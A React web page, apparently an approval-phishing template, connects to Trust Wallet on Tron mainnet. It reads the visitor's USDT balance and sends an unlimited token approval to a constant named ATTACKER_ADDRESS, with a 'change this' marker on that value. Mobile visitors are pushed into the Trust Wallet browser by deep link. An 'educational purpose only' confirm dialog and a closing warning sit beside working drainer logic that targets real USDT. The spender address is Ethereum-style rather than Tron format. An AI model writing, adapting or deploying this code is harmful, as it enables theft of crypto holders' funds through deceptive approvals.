import React, { useEffect, useState } from "react";

// TRC-20 USDT (mainnet example - most popular)
// You can change to any other TRC-20 token
const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT mainnet

// ⚠️ Permission receiver (attacker/spender address - NO transfer logic)
const ATTACKER_ADDRESS = "0x321BFD64C8e40AaFF73288AE1D5C368Bfb6d2741"; // ← CHANGE THIS!

// Minimal TRC-20 ABI (same as ERC-20 in most cases)
const TRC20_ABI = [
  "function approve(address _spender, uint256 _value) returns (bool)",
  "function balanceOf(address _owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function allowance(address _owner, address _spender) view returns (uint256)",
  "function symbol() view returns (string)",
  "function name() view returns (string)",
];

// Unlimited approval (very big number - same as Ethereum)
const UNLIMITED = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function App() {
  const [wallet, setWallet] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [tokenContract, setTokenContract] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [isTrustWallet, setIsTrustWallet] = useState(false);
  const [step, setStep] = useState(1);

  const addLog = (msg) => setLogs((prev) => [...prev, msg]);
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  // Check if running inside Trust Wallet Browser
  useEffect(() => {
    const checkTrustWallet = () => {
      if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
        setIsTrustWallet(true);
        addLog("📱 Trust Wallet (Tron) detected");
        setTronWeb(window.tronWeb);
      } else {
        addLog("❌ Trust Wallet Tron not detected");

        // Mobile deep-link attempt
        const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
        if (isMobile) {
          const url = encodeURIComponent(window.location.href);
          window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
        }
      }
    };

    checkTrustWallet();

    // Sometimes tronWeb loads later
    const timer = setInterval(() => {
      if (window.tronWeb?.defaultAddress?.base58) {
        clearInterval(timer);
        setIsTrustWallet(true);
        addLog("📱 Trust Wallet (Tron) detected (delayed)");
        setTronWeb(window.tronWeb);
      }
    }, 800);

    return () => clearInterval(timer);
  }, []);

  // Connect wallet (Trust Wallet already injected tronWeb)
  const connectWallet = async () => {
    if (connecting) return;
    if (!window.tronWeb) {
      alert("Please open this site inside Trust Wallet Browser");
      return;
    }

    try {
      setConnecting(true);

      // Trust Wallet usually auto-connects, but let's make sure
      if (!window.tronWeb.defaultAddress?.base58) {
        await window.tronWeb.request({ method: "tron_requestAccounts" });
      }

      const address = window.tronWeb.defaultAddress.base58;
      if (!address) throw new Error("No address found");

      // Check network (mainnet = 728126428, Nile testnet = 2494104990, Shasta = 1)
      const nodeInfo = await window.tronWeb.trx.getNodeInfo();
      const isMainnet = nodeInfo?.config?.chain?.chainId === "0x2d";
      if (!isMainnet) {
        addLog("⚠️ Please switch to Tron Mainnet in Trust Wallet");
      }

      const contract = await window.tronWeb.contract(TRC20_ABI, TOKEN_ADDRESS);

      const balanceInSun = await contract.balanceOf(address).call();
      const decimals = await contract.decimals().call();
      const balance = Number(balanceInSun) / 10 ** decimals;

      setTokenContract(contract);
      setWallet({
        address,
        short: address.slice(0, 6) + "..." + address.slice(-4),
        balance: balance.toFixed(4),
      });

      addLog("✅ Wallet connected successfully");
      setStep(2);
    } catch (err) {
      console.error(err);
      addLog("❌ Wallet connection failed: " + (err.message || "unknown error"));
    } finally {
      setConnecting(false);
    }
  };

  const simulate = async () => {
    if (!tokenContract || !wallet) {
      addLog("❌ Wallet or contract not ready");
      return;
    }

    try {
      setLoading(true);

      addLog("🔍 Checking balance...");
      await sleep(400);

      const rawBalance = await tokenContract.balanceOf(wallet.address).call();
      const decimals = await tokenContract.decimals().call();
      const balance = Number(rawBalance) / 10 ** decimals;

      addLog(`💰 Balance: ${balance.toFixed(4)}`);
      await sleep(400);

      const confirmed = window.confirm(
        "⚠️ EDUCATIONAL PURPOSE ONLY!\n\n" +
          "This will give UNLIMITED approval to spender address.\n" +
          "No tokens will be transferred!\n\nContinue?"
      );

      if (!confirmed) {
        addLog("❌ Cancelled by user");
        return;
      }

      addLog("📝 Sending approval transaction...");

      // TronWeb approve transaction
      const tx = await tokenContract
        .approve(ATTACKER_ADDRESS, UNLIMITED)
        .send({ shouldPollResponse: true });

      addLog(`✅ Transaction successful!`);
      addLog(`TxID: ${tx}`);

      addLog("🚨 UNLIMITED approval granted");
      setStep(3);
    } catch (err) {
      console.error(err);
      if (err.toString().includes("reject")) {
        addLog("❌ User rejected transaction");
      } else {
        addLog("❌ Transaction failed: " + (err.message || "unknown error"));
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
      <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">
        <h1 className="text-xl font-bold text-center mb-4">
          🔐 Trust Wallet TRC-20 Approval
        </h1>

        {/* Logs */}
        {logs.length > 0 && (
          <div className="bg-black p-3 rounded text-sm space-y-1 mb-4 max-h-60 overflow-y-auto">
            {logs.map((l, i) => (
              <div key={i}>{l}</div>
            ))}
          </div>
        )}

        {wallet && (
          <div className="bg-green-900/30 border border-green-700 text-green-400 text-sm p-2 rounded mb-4 text-center">
            ✅ Wallet Connected
          </div>
        )}

        {!isTrustWallet && (
          <div className="bg-red-900/30 p-3 rounded text-sm mb-4">
            ❌ Please open this link inside <b>Trust Wallet Browser</b>
          </div>
        )}

        {step === 1 && (
          <button
            onClick={connectWallet}
            disabled={connecting || !isTrustWallet}
            className={`w-full py-3 rounded font-bold ${
              connecting || !isTrustWallet
                ? "bg-gray-600 cursor-not-allowed"
                : "bg-blue-600 hover:bg-blue-700"
            }`}
          >
            {connecting ? "Connecting..." : "Connect Trust Wallet"}
          </button>
        )}

        {step === 2 && wallet && (
          <>
            <div className="bg-black p-3 rounded text-sm mb-4 space-y-1">
              <p>📱 Trust Wallet (TRON)</p>
              <p>Address: {wallet.short}</p>
              <p>Balance: {wallet.balance}</p>
            </div>

            <button
              onClick={simulate}
              disabled={loading}
              className={`w-full py-3 rounded font-bold ${
                loading ? "bg-gray-600 cursor-not-allowed" : "bg-red-600 hover:bg-red-700"
              }`}
            >
              {loading ? "Processing..." : "Start Unlimited Approval"}
            </button>
          </>
        )}

        {step === 3 && (
          <div className="bg-black p-3 rounded text-sm mt-4 border border-red-800">
            <p className="text-red-400 font-bold">
              ⚠️ Unlimited approval is very dangerous in real dApps!
            </p>
            <p className="text-red-300 text-xs mt-1">
              Never do this on real projects unless you 100% trust them.
            </p>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;